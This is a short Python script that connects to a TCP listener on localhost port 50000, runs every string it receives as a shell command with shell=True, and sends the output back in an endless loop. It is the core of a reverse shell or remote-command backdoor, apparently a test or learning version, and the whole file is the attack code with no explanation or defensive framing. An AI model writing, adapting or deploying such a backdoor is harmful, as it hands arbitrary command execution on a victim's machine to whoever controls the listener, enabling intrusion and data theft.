import socket
import threading
import subprocess

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost', 50000))




def action():
    try:  
        message = client.recv(1024).decode('utf-8')
        output = subprocess.check_output(message, shell=True)
        client.send(output)

    except Exception as e:
        print(e)
        pass
        

while True:
    action()
